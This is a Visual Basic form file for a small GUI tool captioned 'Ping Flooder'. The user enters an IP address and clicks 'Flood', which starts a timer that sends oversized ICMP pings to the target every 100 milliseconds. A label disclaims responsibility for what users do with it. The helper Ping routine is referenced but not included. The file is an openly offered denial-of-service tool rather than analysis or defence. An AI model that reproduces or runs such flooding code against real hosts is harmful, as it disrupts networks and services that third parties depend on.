VERSION 4.00
Begin VB.Form Form36 
   BackColor       =   &H00FF0000&
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Ping Flooder"
   ClientHeight    =   1215
   ClientLeft      =   4440
   ClientTop       =   3330
   ClientWidth     =   3225
   Height          =   1680
   Left            =   4380
   LinkTopic       =   "Form36"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   1215
   ScaleWidth      =   3225
   ShowInTaskbar   =   0   'False
   Top             =   2925
   Width           =   3345
   Begin VB.TextBox Text2 
      Height          =   285
      Left            =   120
      Locked          =   -1  'True
      TabIndex        =   2
      Top             =   840
      Width           =   1935
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   100
      Left            =   1440
      Top             =   480
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Flood"
      Height          =   615
      Left            =   2160
      TabIndex        =   1
      Top             =   480
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   120
      TabIndex        =   0
      Text            =   "IP Address"
      Top             =   480
      Width           =   1935
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Caption         =   "I'm not responsible 4 what  u do with this."
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   120
      TabIndex        =   3
      Top             =   120
      Width           =   3015
   End
End
Attribute VB_Name = "Form36"
Attribute VB_Creatable = False
Attribute VB_Exposed = False
Private Sub Command1_Click()
Dim ECHO As ICMP_ECHO_REPLY
If Command1.Caption = "Flood" Then
timer1.Enabled = True

Command1.Caption = "Stop"
 Else
timer1.Enabled = False
text2.Text = ""
Command1.Caption = "Flood"
End If
End Sub

Private Sub Form_Load()
Top = 0
Left = 0
FFX.StayOnTop Me
Me.Picture = Form1.image2.Picture
Form1.Hide
End Sub

Private Sub Form_Unload(Cancel As Integer)
Form1.Visible = True
Unload Me
End Sub


Private Sub timer1_Timer()
Dim ECHO As ICMP_ECHO_REPLY
Call Ping(Text1.Text, ECHO, "9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999")
text2.Text = ECHO.DataSize & " bytes"

End Sub


